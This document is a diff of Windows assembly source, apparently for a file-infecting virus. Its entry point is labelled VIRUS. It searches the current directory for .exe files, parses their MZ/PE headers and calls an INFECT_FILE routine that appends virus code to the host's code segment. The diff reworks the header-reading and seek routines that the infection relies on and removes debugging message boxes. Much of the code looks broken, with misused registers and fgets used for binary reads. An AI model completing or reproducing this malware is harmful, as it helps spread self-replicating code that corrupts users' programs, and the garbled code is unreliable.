@@ -4,6 +4,7 @@
 format PE console
 entry  VIRUS
 include 'win32ax.inc'
+
 ;Useful constants
 DATABUF_SIZE EQU 4096 ;size of read/write buf
 NEW_HDR_SIZE EQU 40H ;size of new EXE header
@@ -23,14 +24,11 @@ section '.text' code readable executable
 
 VIRUS:
 
- invoke  MessageBoxA, HWND_DESKTOP,VIRUSM,notify_msg, MB_OK
-
  call CREATE_DS ;create the data segment
  ; Check for error
  test eax, eax
  jz error_exit
 
- invoke  MessageBoxA, HWND_DESKTOP,CREATE_DS_MSG, notify_msg, MB_OK
  ; Store memory handle
  mov [MEM_HANDLE], eax
 
@@ -47,18 +45,17 @@ VIRUS:
 
   ; Mostrar el mensaje utilizando MessageBoxA
   invoke MessageBoxA, 0, [allocated_memory],notify_msg, MB_OK
-  invoke  MessageBoxA, HWND_DESKTOP,INIT_DS_MSG,notify_msg, MB_OK
 
   stdcall scan_dir, _allfiles
 
   jc  common_error
 
   jnz SHORT GOTO_HOST ;z set if a file was found
-  invoke  MessageBoxA, HWND_DESKTOP,INFECT_FILEM, notify_msg, MB_OK
+
   call INFECT_FILE ;infect it if found
 
 GOTO_HOST:
- invoke  MessageBoxA, HWND_DESKTOP,DESTROY_DSM, DESTROY_DSM, MB_OK
+
  call DESTROY_DS ;clean up memory
  pop es
  pop ds
@@ -235,8 +232,7 @@ FILE_OK:
 
    ; Inicializar el puntero al búfer
 
-   mov edi, NEW_HDR
-   mov ecx,NEW_HDR_SIZE
+
 
    ROPEN:
    invoke fopen, FilePath,"r"  ;MILACOM
@@ -244,125 +240,113 @@ FILE_OK:
    cmp eax,0
    je FOK_ERROR2
     mov dword[fileHandle],eax ;guardar puntero para despues  en una variable
-   mov ebx, eax ; Guardar el puntero al archivo en ebx
-   ;call FILE_READ ;ok, read EXE header
+
+    mov ebx,dword[fileHandle] ; Guardar el puntero al archivo en ebx
+    mov edi, NEW_HDR
+    mov ecx,NEW_HDR_SIZE
+
+    call FILE_READ ;ok, read EXE header
+    invoke MessageBoxA, HWND_DESKTOP,NEW_HDR ,notify_msg, MB_OK
 
 
 
 
-  read_loop:
-
-
-    ; Leer un byte del archivo
-  RREAD:   invoke fgetc, ebx
-
-   cmp byte[ebx], -1
-   je end_of_file
-
-   cmp ecx, 0
-   je end_of_file
-
-    ; Almacenar el byte en el búfer
-    mov dword[edi], eax
-
-    inc edi
-    dec ecx
-
-    ; Repetir el proceso hasta alcanzar el final del archivo
-    jmp read_loop
-
-     end_of_file:
-
-    ; Colocar el terminador de cadena en el último byte del búfer
-     mov byte [edi], 0
-    ; Imprimir el contenido leído
-     invoke MessageBoxA, HWND_DESKTOP,NEW_HDR ,notify_msg, MB_OK
 
      cmp word [NEW_HDR],5A4DH;see if first 2 bytes are ’MZ’
-     jnz  FN1 ;nope, file not an EXE, exit
+     jne  FN1 ;nope, file not an EXE, exit
 
      cmp byte[NEW_HDR+10h],40H ;see if rel tbl at 10H or more ;antes 18 MILACOM
      jne  FN1 ;nope, it can’t be a Windows EXE
 
-      mov edx,DWORD [NEW_HDR+3CH] ;ok, put offset to new header in dx  ;pe gui offset
-      invoke MessageBoxA, HWND_DESKTOP,DWORD [NEW_HDR+3CH] ,notify_msg, MB_OK
-      mov dword[NH_OFFSET],edx ;and save it here
+
+       mov ecx,3Ch ;e_lfanew
+       mov ebx,dword[fileHandle] ; Guardar el puntero al archivo en ebx
+      call FILE_SEEK_ST
+
+      mov edi,e_lfanew
+      mov ecx,4 ;dword
+
+     call FILE_READ ;ok, read EXE header
+     ;mov edx,DWORD [NEW_HDR+3CH] ;ok, put offset to new header in dx  ;pe gui offset
+     invoke MessageBoxA, HWND_DESKTOP,e_lfanew ,notify_msg, MB_OK
+
+      mov dword[NH_OFFSET],e_lfanew ;and save it here
+
+      mov ecx,dword[e_lfanew] ;PE signature
+      mov ebx,dword[fileHandle] ; Guardar el puntero al archivo en ebx
+
+      call FILE_SEEK_ST
+
+
+       ; Mover el puntero del archivo a la posición 80h desde el inicio del archivo
+
 
        mov edi, NEW_HDR2
        mov ecx,NEW_HDR_SIZE
-       RSEEK:
-      ; Mover el puntero del archivo a la posición 80h desde el inicio del archivo
-       invoke fseek, [fileHandle],80h, 0     ;PE header
+
+       call FILE_READ
+       invoke MessageBoxA, HWND_DESKTOP,NEW_HDR2 ,notify_msg, MB_OK
 
 
-      ; call FILE_READ MILACOM
-      read_loop2:
-
-
-      ; Leer un byte del archivo
-      RREAD2:   invoke fgetc, ebx
-
-      cmp byte [ebx], -1
-       je end_of_file2
-
-       cmp ecx, 0
-       je end_of_file2
-
-      ; Almacenar el byte en el búfer
-       mov dword[edi], ebx
-
-       inc edi
-       dec ecx
-
-        ; Repetir el proceso hasta alcanzar el final del archivo
-        jmp read_loop2
-
-        end_of_file2:
-
-       ; Colocar el terminador de cadena en el último byte del búfer
-        mov byte [edi], 0
-      ; Imprimir el contenido leído
-       invoke MessageBoxA, HWND_DESKTOP,NEW_HDR2, notify_msg, MB_OK       ;second header
-
-       mov DWORD[NEW_HDR2],"PE" ;test
       cmp DWORD[NEW_HDR2],"PE" ;see if this is ’NE’ new header ID
       jnz SHORT FN1 ;nope, not a Windows EXE!
 
-       mov al,byte[NEW_HDR2+36H] ;get target OS flags
-       and al,2 ;see if target OS = windows
-       jnz SHORT FOK2 ;ok, go on
-        invoke MessageBoxA, HWND_DESKTOP,next_msg,notify_msg , MB_OK       ;second header
+
+
+      mov al,byte[NEW_HDR2+36H] ;get target OS flags
+      and al,2 ;see if target OS = windows
+      jz SHORT FOK2 ;ok, go on  ;jnz SHORT FOK2 ;ok, go on
+      invoke MessageBoxA, HWND_DESKTOP,dword[NEW_HDR2+36H] ,notify_msg, MB_OK
        FN1: jmp FOK_ERROR1 ;else exit
        ;If we get here, then condition (1) is fulfilled.
-       FOK2: mov edx,DWORD[NEW_HDR+16H] ;get initial cs
+       FOK2:
+
+
+
+        mov ecx,dword[e_lfanew] ;ir a la ubicacion informada por e_lfanew
+        mov ebx,dword[fileHandle] ; Guardar el puntero al archivo en ebx
+        call  FILE_SEEK_ST
+        ; Lee el campo e_lfanew del encabezado MZ
+
+        mov ecx, 4
+        mov edi, EntryPoint
+        mov ebx,dword[fileHandle]
+
+        call FILE_READ
+        invoke MessageBoxA, HWND_DESKTOP,EntryPoint,notify_msg, MB_OK
+        invoke MessageBoxA, HWND_DESKTOP,next_msg ,notify_msg, MB_OK
+
+        ;mov edx,DWORD[NEW_HDR+16H] ;get initial cs
+
        call GET_SEG_ENTRY ;and read seg table entry into disk buf
+
         mov eax,DWORD [TEMP+2] ;put segment length in ax
         add eax,VIRUS_SIZE ;add size of virus to it
         jc SHORT FOK_ERROR1 ;if we carry, there’s not enough room
         ;else we’re clear on this count
        ;If we get here, then condition (2) is fulfilled.
- mov ecx,DWORD[NEW_HDR+32H] ;logical sector alignment
- mov eax,1
- shl eax,cl ;ax=logical sector size
- mov ecx,DWORD [TEMP] ;get logical-sector offset of start seg
- mul ecx ;byte offset in dx:ax
- add eax,DWORD [NEW_HDR+14H] ;add in ip of entry point
- adc edx,0
- mov ecx,edx
- mov edx,eax ;put entry point in cx:dx
- call FILE_SEEK_ST ;and seek from start of file
- mov ecx,20H ;read 32 bytes
- mov edx,TEMP ;into buffer
- call FILE_READ
- mov esi,[VSTART]
- mov edi, TEMP
- mov ecx,10H ;compare 32 bytes
-FOK3: mov eax,DWORD[si]
- add esi,2
- cmp eax,dword[di]
- jne SHORT FOK4
- add edi,2
- loop FOK3
+        mov ecx,DWORD[NEW_HDR+32H] ;logical sector alignment
+        mov eax,1
+        shl eax,cl ;ax=logical sector size
+         mov ecx,DWORD [TEMP] ;get logical-sector offset of start seg
+         mul ecx ;byte offset in dx:ax
+        add eax,DWORD [NEW_HDR+14H] ;add in ip of entry point
+        adc edx,0
+        mov ecx,edx
+        mov edx,eax ;put entry point in cx:dx
+        call FILE_SEEK_ST ;and seek from start of file
+        mov ecx,20H ;read 32 bytes
+        mov edx,TEMP ;into buffer
+        call FILE_READ
+        mov esi,[VSTART]
+        mov edi, TEMP
+        mov ecx,10H ;compare 32 bytes
+        FOK3: mov eax,DWORD[si]
+        add esi,2
+        cmp eax,dword[di]
+        jne SHORT FOK4
+        add edi,2
+        loop FOK3
 
 FOK_ERROR1:
  call FILE_CLOSE
@@ -373,9 +357,7 @@ FOK_ERROR2:
 ret ;and return to caller
 FOK4: xor al,al ;set Z flag
  ret ;and exit
- FILE_READ:
 
-     ret
 ;******************************************************************************
 ;This routine modifies the file we found to put the virus in it. There are a
 ;number of steps in the infection process, as follows:
@@ -508,18 +490,37 @@ US4: mov dword[TEMP],eax ;adjust segment loc in memory
 ;This routine goes to the segment table entry number specified in dx in the
 ;file and reads it into the TEMP buffer. dx=1 is the first entry!
 GET_SEG_ENTRY:
+ push ebx
+ push esi
+ push edi
+
+
  dec edx
  mov cl,3
  shl edx,cl
  add edx,dword[NH_OFFSET]
  add edx,dword[NEW_HDR+22H] ;dx=ofs of seg table entry requested
- xor ecx,ecx ;in the file
- call FILE_SEEK_ST ;go to specified table entry
+ mov ecx,edx
+; call FILE_SEEK_ST ;go to specified table entry
+ invoke fseek, [fileHandle],ecx, 0
+
+
+
  jc SHORT GSE1 ;exit on error
  mov edx,TEMP
- mov ecx,8
+
+ mov ebx,dword[fileHandle]
+ mov edi, edx
+ xor ecx,ecx
+ mov cl,8
  call FILE_READ ;read table entry into disk buf
-GSE1: ret
+
+
+GSE1:
+ POP ebx
+ POP esi
+ POP edi
+ret
 ;This routine moves the end of the virus out by VIRSECS. The “end” is
 ;everything after the initial code segment where the virus will live.
 ;The variable VIRSECS is assumed to be properly set up before this is called.
@@ -860,6 +861,46 @@ URT3: pop ecx
  jmp URT1 ;go get another typeinfo record
 URTE: ret
 
+
+
+FILE_READ:
+  push ebp
+   mov ebp, esp
+
+    ; Argumentos para fgetc: el primer argumento es el identificador de archivo en ebx
+    ; Llamar a fgetc
+    invoke fgets,edi,ecx,ebx
+
+    ; Verificar si fgetc falló (retornó -1)
+    cmp eax, -1
+    je fgetc_failed
+   ; Retornar el byte leído (en AL)
+    mov esp, ebp
+   pop ebp
+    ret
+
+file_handle_invalid:
+    ; Mostrar mensaje de error
+    invoke MessageBoxA, HWND_DESKTOP, error_message, notify_msg, MB_OK
+
+    ; Terminar la función con un valor de error (-1)
+    mov eax, -1
+    jmp exit_read_byte_from_file
+
+fgetc_failed:
+    ; Mostrar mensaje de error
+    invoke MessageBoxA, HWND_DESKTOP, fgetc_error_message, notify_msg, MB_OK
+
+    ; Terminar la función con un valor de error (-1)
+    mov eax, -1
+    jmp exit_read_byte_from_file
+
+exit_read_byte_from_file:
+    mov esp, ebp
+    pop ebp
+    ret
+
+
 FILE_WRITE:
  push es
  push ebx ;preserve bx through this call
@@ -876,14 +917,17 @@ RWRITE: call WriteFile
 
 
 FILE_SEEK_ST:
+
+  xor edx,edx
+
 FILE_SEEK:
 
-
-
-;   RSEEK: invoke SetFilePointer, dword[eax], edx, 0, FILE_BEGIN  ; Call SetFilePointer
-;   invoke MessageBoxA, HWND_DESKTOP,next_msg ,notify_msg, MB_OK
-
-
+  push ebp
+   mov ebp, esp
+ RSEEK: invoke fseek, ebx,ecx,edx     ;PE header
+; Mover el puntero del archivo a la posición ecx desde el inicio del archivo
+mov esp, ebp
+pop ebp
    ret
 FILE_CLOSE:
  push ebx ;pass handle to _lclose
@@ -951,45 +995,22 @@ VIRSECS DD ? ;secs added to file for virus
 INITSEC DD ? ;init cs loc in file (sectors)
 RELOCS DD ? ;number of relocatables in cs
 LOG_SEC DD ? ;logical sector size for program
-CS_SIZE DD ? ;code segment size
-KERNEL DD ? ;KERNEL module number
-MEM_HANDLE DD ? ;memory handle for data segment
-NEW_HDR DW NEW_HDR_SIZE dup (?) ;space to put new exe header in
-NEW_HDR2 DW NEW_HDR_SIZE dup (?) ;space to put new exe header in
-TEMP DB DATABUF_SIZE dup (?) ;temporary data storage
-;file params
-DesiredAccess dd GENERIC_READ or GENERIC_WRITE
-ShareMode dd 0
-SecurityAttributes dd 0
-CreationDisposition dd OPEN_EXISTING
-FlagsAndAttributes dd FILE_ATTRIBUTE_NORMAL
-TemplateFile dd 0
-
-error_message_1 db "Error al abrir el archivo", 0
-error_title db "Error", 0
-VIRUSM db "VIRUS",0
-
-CREATE_DSM db "CREATE_DS",0
-VIR_STARTM db "VIR_START",0
-
-INIT_DSM db "INIT_DS",0
-
-
-INFECT_FILEM db "INFECT_FILE",0
-
-DESTROY_DSM db  "DESTROY_DS",0
-
-ERROR_CREATE_DSM db "Error creating DSM"   ,0
-
-COPY_STRING_TO_MEMORYM  db  "COPYING THE STRING TO THE MEMORY",0
-
-
-
-
-   allocated_memory dd ?
-    NOTIFY_MSG DB  "Important advice!",0
-    CREATE_DS_MSG db "DS WAS CREATED!",0
-    INIT_DS_MSG db "DS WAS INITIALIZED!",0
+    CS_SIZE DD ? ;code segment size
+    KERNEL DD ? ;KERNEL module number
+    MEM_HANDLE DD ? ;memory handle for data segment
+    NEW_HDR DW 40h dup (0) ;space to put new exe header in
+    NEW_HDR2 DW 40h dup (0) ;space to put new exe header in
+    e_lfanew  DD ?
+    EntryPoint  DD ?
+    TEMP DB DATABUF_SIZE dup (?) ;temporary data storage
+    ;file params
+    DesiredAccess dd GENERIC_READ or GENERIC_WRITE
+    ShareMode dd 0
+    SecurityAttributes dd 0
+    CreationDisposition dd OPEN_EXISTING
+    FlagsAndAttributes dd FILE_ATTRIBUTE_NORMAL
+    TemplateFile dd 0
+    allocated_memory dd ?
     EXIT_MSG db "Exiting from the program!",0
 
     _allfiles       TCHAR   "*.exe", 0
@@ -1002,15 +1023,16 @@ _fmt            TCHAR   "%8x %.260s", 10, 0
    section '.rdata' readable
 
     message db '¡Hola,pinche mundo chinga sumadre!', 0
-    error_message db 'Error al reservar memoria', 0
+    ERROR_CREATE_DSM db 'Error creating DSM', 0
+    error_message db 'Error no especificado', 0
     notify_msg db "Notificacion",0
     next_msg db "Next instruction!",0
-
+    fgetc_error_message db "FGETC error message!",0
    ; Constantes utilizadas para VirtualAlloc
-   MEM_RESERVE equ 0x2000
-   MEM_COMMIT equ 0x1000
-   PAGE_READWRITE equ 0x04
-  MEM_RELEASE equ 0x8000
+    MEM_RESERVE equ 0x2000
+    MEM_COMMIT equ 0x1000
+    PAGE_READWRITE equ 0x04
+    MEM_RELEASE equ 0x8000
 
 
 DATAEND dd $
@@ -1042,8 +1064,8 @@ section '.idata' import data readable writeable
            SetCurrentDirectory, "SetCurrentDirectoryA"
            import  MSVCRT, printf, "printf" , \
             fopen, 'fopen', \
+            fgets, 'fgets', \
             fclose, 'fclose', \
-            fgetc, 'fgetc',\
             fseek, 'fseek'
   import user,\
            MessageBoxA, 'MessageBoxA',\
@@ -1051,4 +1073,6 @@ section '.idata' import data readable writeable
 
 
 wfd             WIN32_FIND_DATA
+
+
 END_CODE:
